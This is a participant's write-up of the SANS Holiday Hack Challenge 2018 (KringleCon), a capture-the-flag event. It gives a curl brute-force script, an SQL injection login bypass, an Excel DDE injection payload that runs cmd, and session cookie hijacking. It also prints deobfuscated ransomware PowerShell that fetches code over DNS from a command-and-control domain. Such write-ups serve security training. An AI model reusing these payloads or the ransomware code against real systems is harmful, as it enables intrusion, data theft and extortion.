Smith (berninator) OSCP, CCNA Cyber Ops mail@brndjsmith.net Introduction This year's challenge comes in the form of a virtual cyber security conference, KringleCon! The goal is simple: work your way through ten objectives in order to identify the mastermind behind the activities surrounding the event. Every objective comes with a corresponding talk from an industry professional as well as a terminal exercise to earn hints from. So, if you're stuck, make sure to go over all of the learning materials again, as well as the provided hints; you may just get the flash of insight you need to get through it. You can find more information about the challenge on the Holiday Hack Challenge website. To start walking around the conference and solving objectives, just create an account on the KringleCon website. For your convenience, here is a rough map of KringleCon with the locations of each challenge and terminal exercise. Keep in mind, the following objectives have no in-world component: Challenge 2: Directory Browsing Challenge 4: Data Repo Analysis Challenge 5: AD Privilege Discovery Challenge 7: HR Incident Response Challenge 8: Network Traffic Forensics Consolidated Answers This is a consolidated list of the answers for use on the main website . Please keep in mind, if you wish to go through the challenge through KringleCon then some of these answers may require you to also interact with an in-game object. Happy Trails John McClane Welcome unprepared speaker! Yippee-ki-yay LDUBEJ00320@AD.KRINGLECASTLE.COM 19880715 Fancy Beaver Mary Had a Little Lamb Snort is alerting on all ransomware and only the ransomware! erohetfanu.com Successfully registered yippeekiyaa.aaay! ED#ED#EED#EF#G#F#G#ABA#BA#B You have unlocked Santa's vault! Santa Main Objectives 1) Orientation Challenge What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge. This challenge stretches our open-source intelligence (OSINT) gathering muscles by requiring us to search through previous challenges for the answers to the quiz questions. Luckily, we can find every link to the previous challenges in one page: https://holidayhackchallenge.com/past-challenges/ We can access the quiz through the kiosk located on the first floor, but another option to is to navigate directly to the challenge's link: https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html Answers: Question Answer In 2015, the Dosis siblings asked for help understanding what piece of their \"Gnome in Your Home\" toy? Firmware In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation? ATNAS In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left? Business card In 2016, Linux terminals at the North Pole could be accessed with what kind of computer? Cranberry Pi In 2017, the North Pole was being bombarded by giant objects. What were they? Snowballs In 2017, Sam the snowman needed help reassembling pages torn from what? The Great Book Upon correctly answering each question, we're greeted with the secret phrase: Happy Trails 2) Directory Browsing Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out . For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge. Upon navigating to https://cfp.kringlecastle.com/ , we begin by seeing our options in mapping out the website. However, the various links within the homepage lead only to https://cfp.kringlecastle.com/cfp/cfp.html , making that our only other option, right now. After running out of options for publically navigable pages, we start looking into ways to access more non-public ones. Our first attempt was to manually request https://cfp.kringlecastle.com/cfp/ , by removing the 'cfp.html' from the URL. This proved very fruitful as we discover that the web server has left 'directory indexing' enabled, showing us a list of files within the '/cfp/' directory. One of the two files seems to be a list of rejected talks and should contain the information we're looking for. There are two options to obtain this information: in the browser, or in the command line. Since the file is small, only 30KBs , and our search is relatively simple, we can make use of the browser's find function to search for the target information. However, if the file were to be much larger in size or if we needed to find more nuanced data, we could instead make use of the terminal to find our target information. The example here uses the 'curl' program to download the 'rejected-talks.csv' file and pipes it into the 'grep' program, which allows us to search the data using regular expressions. In this case, the regular expression is only a simple string. bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s https://cfp.kringlecastle.com/cfp/rejected-talks.csv | grep Data Loss for Rainbow Teams: A Path in the Darkness qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11 Through either of these searches, we discover that the author of 'Data Loss for Rainbow Teams: A Path in the Darkness', and the answer to this challenge, is John McClane . 3) de Bruijn Sequences When you break into the speaker unpreparedness room, what does Morcel Nougat say? For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge. We can find this challenge on in the right hallway of the second floor. Clicking on the door passcode sprite brings us to the next challenge. We are given four symbols to chose from in order to create a four character passcode. Alternatively, you can use the following link to work on this challenge: https://doorpasscoden.kringlecastle.com/ One thing that is interesting about this lock's behavior is, whenever you input another character while the passcode is four characters long, the new character is simply appended to the end of the passcode while removing the first character. This cyclic characteristic makes it possible to greatly simplify the time it would take to manually brute force the correct password by using a de Bruijn sequence. A de Bruijn sequence is the shortest sequence where every combination of a given character set and word length will exist within that sequence. For example, given a character set of $[a, b, c]$ and a word length of two, you can find every possible combination of those characters within the following sequence: ${a a b a c b b c c}$ Since this passcode application simply looks at the previous four characters entered, we can manually brute force the door's code by inputting a de Bruijn sequence, one by one. By assigning each character to a number, we generate a sequence with a character set of four and a word length of four, using this website: http://www.hakank.org/comb/debruijn.cgi?k=4 n=4 submit=Ok Where [0 = \u25b2, 1 = \u25fc, 2 = \u25ef, 3 = \u2605] 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 Using this sequence, we will brute force the door's combination within 256 button presses. After working through 22 characters of the sequence, we reach the correct answer, \u25b2\u25fc\u25ef\u25b2, located within the sequence here: 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 After inputting the correct passcode and breaking into the speaker unpreparedness room, Morcel Nougat gives us the answer to this challenge: Welcome unprepared speaker! Alternative Solutions: Downloading the victory message directly: Looking through the source code for https://doorpasscoden.kringlecastle.com reveals an interesting line of HTML near the bottom of the source at line 123. This appears to be the victory banner used in the event of a correct passcode. By navigating to the image directly, we can simply see the victory message without dealing with bruteforcing the passcode. img id= banner src= db-victory-banner.png style= position:absolute; left:50%; top:50%; transform: translate(-50%, -50%); max-width:60%; width: 60%; visibility: hidden; onMouseDown='this.style.visibility= hidden ' We can also discover this image via the 'Sources' tab of Google Chrome's DevTools. Brute-forcing the passcode: By examining the passcode application through the Chrome DevTools' Network tab, we can learn how it performs the password check and verifies validity. Here we see that the application checks the passcode's correctness by sending a GET request to https://doorpasscoden.kringlecastle.com/checkpass.php with two GET parameters: 'i' - the passcode to check, encoded using the numbers 0 to 3. resourceId - set to undefined If the passcode submitted is incorrect, then the webpage responds with: {\"success\":false,\"message\":\"Incorrect guess.\"} If the passcode submitted is correct (0120) then the page responds with: {\"success\":true,\"resourceId\":\"undefined\",\"hash\":\"0273f6448d56b3aba69af76f99bdc741 268244b7a187c18f855c6302ec93b703\",\"message\":\"Correct guess!\"} Since the total number of passcode combinations is only 256, or 4^4 , this is well within the possibility for a computer to brute force. Using the following command, we can generate a wordlist to conduct the brute-force with. This first generates a sequence of numbers from 0000 to 3333, using leading zeroes for numbers less than four characters in length. Then, using grep's extended regular expression function, it filters all numbers who have a character other than 0, 1, 2, or 3, leaving us with 256 valid passcodes to brute-force with. bernard@Bernard-PC:~/NetsecStudy/sans2018$ seq -w 0 3333 | grep -E \"[0-3]{4}\" doorpasses.txt Finally, using the following script, we can brute force the correct passcode to input: #!/bin/bash # Iterates through each line of doorpasses.txt for i in `cat doorpasses.txt`; do # Using grep's '-q' flag, we test if the response from the server includes 'Correct' # If so, then we know we've hit the correct passcode if curl -s https://doorpasscoden.kringlecastle.com/ checkpass.php?i=$i resourceId=undefined | grep -q Correct ; then echo The password is $i curl -s https://doorpasscoden.kringlecastle.com/checkpass.php? i=$i resourceId=undefined echo break; fi done Example run, completes in approximately five seconds: bernard@Bernard-PC:~/NetsecStudy/sans2018$ time ./q3_doorpass.sh The password is 0120 { success :true, resourceId : undefined , hash : 0273f6448d56b3aba69 af76f99bdc741268244b7a187c18f855c6302ec93b703 , message : Correct guess! } real 0m5.048s user 0m0.406s sys 0m1.016s 4) Data Repo Analysis Retrieve the encrypted ZIP file from the North Pole Git repository . What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge. We're first directed to a GitLab repository located at: https://git.kringlecastle.com/Upatree/santas_castle_automation This appears to be a project aimed at automatically controlling a fleet of drones in order to deliver presents for Christmas. Our next step is to clone this repository to our local machine for further analysis. bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git Cloning into 'santas_castle_automation'... remote: Enumerating objects: 949, done. remote: Counting objects: 100% (949/949), done. remote: Compressing objects: 100% (545/545), done. remote: Total 949 (delta 258), reused 879 (delta 205) Receiving objects: 100% (949/949), 4.27 MiB | 11.31 MiB/s, done.

These maps should come in handy for a future challenge. 5) AD Privilege Discovery Using the data set contained in this SANS Slingshot Linux image , find a reliable path from a Kerberoastable user to the Domain Admins group. What\u2019s the user\u2019s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge. This challenge will take place within the provided virtual machine file, HHC2018-DomainHack_2018-12-19.ova . Our first step is to add the image to our VirtualBox VM Manager. One thing to note is that we need to change the Guest OS Type to a 64-bit machine from 32-bit in order for it to boot properly. Our next step is to launch the BloodHound application. Now using the built-in query Shortest Paths to Domain Admins from Kerberoastable Users , we generate a map of all Kerberoastable users who have a path to domain admin. Of each user mapped out in the BloodHound diagram, LDUBEJ00320@AD.KRINGLECASTLE.COM is the only user who can reach domain admin without going through RDP; a control path the instructions specified for us to avoid due to its dependance on local privilege escalation attacks. 6) Badge Manipulation Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available . What is the access control number revealed by the door authentication panel? For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge. We can find this challenge at the very end of the second floor's right hallway. Our first step to to examine the example employee badge given for the challenge. Decoding the QR code in the sample badge, using the following website https://zxing.org/w/decode.jspx, gives the the following string: oRfjg5uGHmbduj2m Intial analysis of the string doesn't decode it to anything else, leaving us to believe that it simply may just be an employee ID. Clicking on the Scan-O-Matic brings us to the scanning UI, with a webcam display located on the left-side screen. Attempting to use the fingerprint scanner gives us the following error message: QR Code Not Found. Only QR Code and White Space may be visible! We also find that we can upload images via the USB port on the bottom right. After uploading the Alabaster's badge, we receive the following error code: PNG Files Only We can convert the badge to a PNG image, but using it still gives us another error message: Authorized User Account Has Been Disabled! By examining the application using Chrome's DevTools, we discover several things. - The URL for the application is located at https://scanomatic.kringlecastle.com/index.html - The app sends a POST request to https://scanomatic.kringlecastle.com/upload with the image file base64-encoded in the b64barcode parameter or in raw form using the barcode parameter. - Using the fingerprint scanner simply sends a blank image to the server; hence the error about not recognizing a QR code. - The app also performs client-side, file-type verification before submitting it to the server. - Since the server only looks for a recognizable QR code, we don't need to worry about pasting a replacement code over the sample badge; we can just send standalone codes to the server. This ability allows us to automate the QR code creation and submission process using the following script: #!/bin/bash qrencode -o q6_exploit.png $1 curl --cookie resource_id=false -X POST -F barcode=@q6_exploit.png https://scanomatic.kringlecastle.com/upload This script converts a string argument into a QR code, submits it to the upload server, and reads back the server's response. Using this script, we test out various types of input to determine the backend SQL query, based on the error messages received. Inputting a single quote, however, gives us a very descriptive error message, informing us of the entire backend query, as well as what database servertype it is, a MariaDB server. {\"data\":\"EXCEPTION AT (LINE 96 \\\"user_info = query(\\\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\\\".format(uid))\\\"): (1064, u\\\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1\\\")\",\"request\":false} After several attempts, we begin to look into UNION injections. Surprisingly, simply setting up the query for a UNION injection attack provides us with an authentication bypass. Providing this data, ' UNION SELECT 'A', 'B', 'C , causes the server to respond with: {\"data\":\"User Access Granted - Control number 19880715\", \"request\":true, \"success\": {\"hash\" : \"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb\", \"resourceId\":\"false\" }} Research into this issue leads me to believe that the server doesn't validate the values returned by the SQL query. As long as it receives a row and that row doesn't have integer 0 as the enabled value, it'll mark the user as valid. This injected query ensures that the server receives a row with the values 'A', 'B', 'C'. Since 'C' is not a 0, the scanner allows that user through. With the successful the SQL injection attack, we unlock the door to Santa's vault and receive the access control number provided by the door panel: 19880715 7) HR Incident Response Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\\candidate_evaluation.docx . Which terrorist organization is secretly supported by the job applicant whose name begins with \"K.\" For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge. Navigating to https://careers.kringlecastle.com/ we're greeted by a job application submission form. Most notably, we're able to submit our work history within a CSV file for the company's review. During our enumeration of the site, we also come across the 404 page. This gave us additional information on how to potentially exfiltrate files from the machine through the /public/ web directory. Based on the hints provided for this challenge, it appears that we must exfiltrate the candidate_evaluation.docx file using a CSV injection attack. Additionally, from the message on the 404 page, we should copy the file to the publicly accessible directory, C:\\careerportal\\resources\\public\\ in order to access it through the web application. By exploiting Excel's dynamic data exchange (DDE) functionality, we can execute operating system commands upon the victim opening the malicious CSV file. To accomplish this, we generate the malicious string using https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads, which will copy the target file into the public directory as berninator.docx , allowing us to download it. C:\\Users\\Bernard\\Documents\\Netsec\\sans2018\\Office-DDE-Payloads python ddeexcel.py [-] Enter DDE payload argument #1: cmd [-] Enter DDE payload argument #2: /c copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\berninator.docx [-] Enter DDE payload argument #3 (press ENTER to omit): [*] Selected DDE payload: cmd|/c copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\berninator.docx [*] Inserting DDE payload into payload-final.xlsx/xl/externalLinks/externalLink1.xml...

Here we discover that the terrorist organization supporting Krampus is Fancy Beaver . Comments (Please summarize your perceptions of the candidate\u2019s strengths, and any concerns that should be considered: Krampus\u2019s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays. Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year. We owe it to Santa to find, recruit, and put forward trusted candidates with the right skills and ethical character to meet the challenges that threaten our joyous season. 8) Network Traffic Forensics Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LACranberry Pi terminal challenge. After registering a Packalyzer account and logging in, we're greeted with an interface that allows us to analyze network traffic, including a function to sniff and record traffic for 20 seconds. Our first step is to take a recording of some traffic and download the generated PCAP file and for analysis in Wireshark. After opening this data within Wireshark, we notice a lot of encrypted TLS packets. This prevents us from deciphering the actual data being transmitted until we can find the SSL keys. By analyzing the webpage in Chrome DevTools, we discover several interesting pieces of information: - Many of the application's supporing files are accessed on port 80 via HTTPS within a pub directory. - There exists an app.js file, which we currently can't see under the sources tab. Using this information, we attempt to search for the app.js file. Although we cannot find it on the normal HTTPS port (443), we successfully find the file on port 80, in either https://packalyzer.kringlecastle.com:80/app.js or https://packalyzer.kringlecastle.com:80/pub/app.js. Analyzing app.js provides us with several key pieces of information about the Packalyzer application: - It runs using HTTP2. - The SSL key log file is located in __dirname + process.env.DEV + process.env.SSLKEYLOGFILE .

Although these packets only show requests for the Packalyzer application, we can still examine the headers of each request to gather cookies for us to impersonate other users. To accomplish this, we need to gather values of for the 'PASESSION' cookie. We gather and test several of these cookies until we come across one that logs us in as 'alabaster', a user with admin privileges and a saved capture file named super_secret_packet_capture.pcap . This capture file contains SMTP traffic of alabaster.snowball@mail.kringlecastle.com sending an email with an attachment to holly.evergreen@mail.kringlecastle.com, the two individuals we're concerned with for this challenge. After extracting and reading the attached pdf file, we learn that the song described by Alabaster in his communications with Holly is Mary Had a Little Lamb . A piano keyboard gives us easy access to every (western) tone. As we go from left to right, the pitches get higher. Pressing the middle A, for example, would give us a tone of 440 Hertz. Pressing the next A up (to the right) gives us 880 Hz, while the next one down (left) produces 220 Hz. These A tones each sound very similar to us - just higher and lower. Each A is an \u201coctave\u201d apart from the next. Going key by key, we count 12 \u201chalf tone\u201d steps between one A and the next - 12 steps in an octave. As you may have guessed, elf (and human) ears perceive pitches logarithmically. That is, the frequency jump between octaves doubles as we go up the keyboard, and that sounds normal to us. Consequently, the precise frequency of each note other than A can only be cleanly expressed with a log base 12 expression. Ugh! For our purposes though, we can think of note separation in terms of whole and half steps. Have you noticed the black keys on the keyboard? They represent half steps between the white keys. For example, the black key between C and D is called C# (c-sharp) or Db (d-flat). Going from C to D is a whole step, but either is a half step from C#/Db. Some white keys don\u2019t have black ones between them. B C and E F are each only a half step apart. Why? Well, it turns out that our ears like it that way. Try this: press C D E F G A B C on a piano. It sounds natural, right? The \u201cC major\u201d scale you just played matches every other major scale: - whole step from C to D - whole step from D to E - half step from E to F - whole step from F to G - Whole step from G to A - Whole step from A to B, and finally - Half step from B to C If you follow that same pattern (whole whole half whole whole whole half), you can start from any note on the keyboard and play a major scale. So a Bb major scale would be Bb C D Eb F G A Bb. You can get this by counting whole and half steps up from Bb or by taking each note in the C major scale and going down a whole step. This uniform shifting of tones is called transposition. This is done all the time in music because of differences in how instruments are designed, the sound an arranger wants to achieve, or the comfortable vocal range of a singer. Some elves can do this on the fly without really thinking, but it can always be done manually, looking at a piano keyboard. To look at it another way, consider a song \u201cwritten in the key of Bb.\u201d If the musicians don\u2019t like that key, it can be transposed to A with a little thought. First, how far apart are Bb and A? Looking at our piano, we see they are a half step apart. OK, so for each note, we\u2019ll move down one half step. Here\u2019s an original in Bb: D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb And take everything down one half step for A: C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A We\u2019ve just taken Mary Had a Little Lamb from Bb to A! 9) Ransomware Recovery Alabaster Snowball is in dire need of your help.

Help, all of our computers have been encrypted by ransomware! I came here to help but got locked in 'cause I dropped my \"Alabaster Snowball\" badge in a rush. I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted! Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.

Your job is to configure snort to alert on ONLY the bad ransomware traffic. GOAL: Create a snort rule that will alert ONLY on bad ransomware traffic by adding it to snorts /etc/snort/rules/local.rules file. DNS traffic is constantly updated to snort.log.pcap COMPLETION: Successfully create a snort rule that matches ONLY bad DNS traffic and NOT legitimate user traffic and the system will notify you of your success. Check out ~/more_info.txt for additional information. elf@c59a963b51a3:~$ cat more_info.txt MORE INFO: A full capture of DNS traffic for the last 30 seconds is constantly updated to: /home/elf/snort.log.pcap You can also test your snort rule by running: snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf This will create an alert file at ~/snort_logs/alert This sensor also hosts an nginx web server to access the last 5 minutes worth of pcaps for offline analysis. These can be viewed by logging into: http://snortsensor1.kringlecastle.com/ Using the credentials: ---------------------- Username | elf Password | onashelf tshark and tcpdump have also been provided on this sensor. HINT: Malware authors often user dynamic domain names and IP addresses that change frequently within minutes or even seconds to make detecting and block malware more difficult. As such, its a good idea to analyze traffic to find patterns and match upon these patterns instead of just IP/domains. After downloading a current capture file, we conduct our analysis and determine several key traits regarding the malicious traffic: - It's performed over DNS - It often involves a subdomain containing a hex-encoded string, in this case for \"wannacookie.min.ps1\". - It sometimes includes a sequence of subsubdomain requests for numbers incrementing from 0. - The domain name always has a permutation of the word \"hans gruber\". - The top-level domain varies between many different possibilities. - There are many various ways to filter out the malicious traffic based on these factors. Here, we will filter out all domain names that contain a ten-character long word that only uses the letters from 'hans gruber'. After modifying our local.rules file, it will look like this: # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert udp any any - any 53 ( msg: Potential Hans CnC Traffic ;pcre: /[hansgruber]{10}/ ; sid:666; rev:1; ) alert udp any 53 - any any ( msg: Potential Hans CnC Traffic ;pcre: /[hansgruber]{10}/ ; sid:667; rev:1; ) After saving the snort rule, it now gives an alert for all ransomware CnC traffic. elf@b6e71d54c2b0:~$ nano /etc/snort/rules/local.rules elf@b6e71d54c2b0:~$ [+] Congratulation! Snort is alerting on all ransomware and only the ransomware! [+] 9b) Identify the Domain Using the Word docm file, identify the domain name that the malware communicates with. Thank you so much! Snort IDS is alerting on each new ransomware infection in our network. Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document? All the elves were emailed a cookie recipe right before all the infections. Take this document with a password of elves and find the domain it communicates with. The document itself seems fairly innocuous at first, containing only the recipe for chocolate chip cookies. However, by extracting the VBA macros embedded within the file, we can see the malicious intent behind it. To extract the macros from the document, we will use olevba from the python-oletools package. Initially, we find that it's encoded using Base64, in what looks like an attempt to obfuscate the script.

Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective. I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections. Perhaps there is a mechanism like that in this ransomware? Do some more analysis and see if you can find a fatal flaw and activate it! Similar to the first de-obfuscation step, we remove iex from the PowerShell command to further deobfuscate this code. Due to the length of the returned output, we simply write the code to wannacookie.min.ps1 , which is what the hex-string 77616E6E61636F6F6B69652E6D696E2E707331 translates to. PS C:\\Users\\Bernard\\Documents\\Netsec\\sans2018 function H2A($a) {$o; $a -split '(..)' | ? { $_ } | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name $f.erohetfanu.com -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name $i.$f.erohetfanu.com -Type TXT).strings}; ($(H2A $h | Out-string)) wannacookie.min.ps1 This retrieves a minified version of the ransomware's code. Although we can still reverse engineer the code with what we have, we attempt to retrieve the non-minified version by performing a request for wannacookie.ps1 , or 77616e6e61636f6f6b69652e707331 , using the modified code. PS C:\\Users\\Bernard\\Documents\\Netsec\\sans2018 function H2A($a) {$o; $a -split '(..)' | ? { $_ } | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = 77616e6e61636f6f6b69652e707331 ; $h = ; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name $f.erohetfanu.com -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name $i.$f.erohetfanu.com -Type TXT).strings}; ($(H2A $h | Out-string)) wannacookie.ps1 By analyzing the deobfuscated ransomware script, we notice an interesting code block at the beginning of the main wannacookie function. $S1 = 1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000 cdd5c5c10000000 if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return} if ($(netstat -ano | Select-String 127.0.0.1:8080 ).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne KRINGLECASTLE ) {return} Several things make these statements interesting: - They are if-statements that end the script if the condition is true. - They are located at the beginning of the main, wannacookie function, giving them a chance to stop any malicious activity if triggered. - The hex value 6B696C6C737769746368 from the subdomain in the first statement translates to killswitch . - The second statement halts execution if the host machine doesn't live on the KRINGLECASTLE domain. This gives evidence that it's an attack that directly targets Santa's network. Like the previous deobfuscation techniques, we remove any potentially damaging code from the code block, modify it to output the desired information, and run it within PowerShell to see the decoded output. Another step for this particular challenge is that we much also import the various functions the \"killswitch\" method makes use of in order for the decoding process to work. After analyzing the various nested functions, we can determine that the killswitch method decodes the domain by simply using an XOR decryption between 1f0f0202171d020c0b09075604070a0a and the data retrieved from the CnC server, which is 66667272727869657268667865666B73 in this case. The full explaination can be found in the Wannacookie Malware Analysis appendix. Our final code and output, sans the importing, is seen below. PS C:\\Users\\Bernard\\Documents\\Netsec\\sans2018 $S1 = 1f8b08000000 0000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000 $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) yippeekiyaa.aaay Based on this output, we can determine that the killswitch domain used by Wannacookie is: yippeekiyaa.aaay We are able to confim this through the Ho Ho Ho Daddy application. Now by registering this domain name, any victim connected to Internet during the infection process will successfully resolve yippeekiyaa.aaay , saving them from potential damage. 9d) Recover Alabaster's Password Recover Alabaster's password as found in the the encrypted password vault. Yippee-Ki-Yay! Now, I have a ma... kill-switch! Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing. As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database. Take this zip with a memory dump and my encrypted password database, and see if you can recover my passwords. One of the passwords will unlock our access to the vault so we can get in before the hackers. Immediately following the killswitch and target verification functions, we see the ransomware's file encryption procedure. It first creates and sends back the encryption key by downloading the CnC server's public key via DNS ( server.crt ), generating a random, 256-bit AES encryption key, and sending that back to the server after encrypting the key using their public key. Afterwards, it encrypts the all .elfdb files on the machine using that key. Finally, it clears the Hex_key and Byte_key variables, reducing the chances for us to find the unencrypted keys within memory. However, the public key encrypted key may still be found. The full analysis of this section can be read in the Wannacookie Malware Analysis appendix. $pub_key = [System.Convert]::FromBase64String($(get_over_dns( 7365727665722E637274 ) ) ) $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]] ([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join '')) | ? {$_ -ne 0x00}) $Hex_key = $(B2H $Byte_key) $Key_Hash = $(Sha1 $Hex_key) $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString() $cookie_id = (send_key $Pub_key_encrypted_Key) $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace `r`n ) [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\\Desktop'), $($env:userprofile+'\\Documents'),$($env:userprofile+'\\Videos') ,$($env:userprofile+'\\Pictures'), $($env:userprofile+'\\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname}) enc_dec $Byte_key $future_cookies $true Clear-variable -Name Hex_key Clear-variable -Name Byte_key Similar to previous methods, we import all associated functions, remove all malicious code, and run this script within our own PowerShell terminal to discern the output of this script.

Although we found several candidates for encryption keys, none of them allow us to decrypt Alabaster's elfdb file. The only remaining option right now is to somehow decrypt the encrypted key by retrieving the server's private key. Similar to what we did to grab the deobfuscated version of the malware, we import the get_over_dns() function to our PowerShell terminal and attempt to download server.key ( 7365727665722e6b6579 ), instead of server.crt ( 7365727665722E637274 ). Hopefully, we can retrieve the server's private key in case the attacker inadvertently left it available for public download. Upon attempting this, we find that we successfully retrieve the server's private key.

Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan. I'm seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password? We can access the Piano Lock on the right wall of Santa's Secret Room or through the independant website: https://pianolockn.kringlecastle.com/ We first try directly playing the notes from Alabaster's password database, but the lock tells us that the key is incorrect. After reading a hint in the badge menu we learn that we must transpose the password into the key of D, from the key of E. Rachmaninoff From: Alabaster Snowball Really, it's Mozart. And it should be in the key of D, not E. This is simply one whole-step down, or one letter. Playing the tune like this gives us the correct key and unlocks the vault. We can also check a tune by sending a GET request to https://pianolockn.kringlecastle.com/checkpass.php, with two GET parameters. i is the notes played and resourceID is undefined . This reveals to us that the entire incident was planned out by Santa , who is looking to find new cybersecurity specialists for his operation next year. You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test! You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot! You see, I finally found you! I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers. That\u2019s why we had so many different challenges this year. We needed to find someone with skills all across the spectrum. I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised. And you did! Oh, and those brutish toy soldiers? They are really just some of my elves in disguise. See what happens when they take off those hats? Based on your victory\u2026 next year, I\u2019m going to ask for your help in defending my whole operation from evil bad guys. And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will. You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted? They lived happily ever after. - Santa Now we've finally completed the SANS Holiday Hack Challenge 2018 ! Terminal Exercises 1) Essential Editor Skills (Bushy Evergreen) You can find this terminal in the first floor lobby, just to the right of the entrance. Hi, I'm Bushy 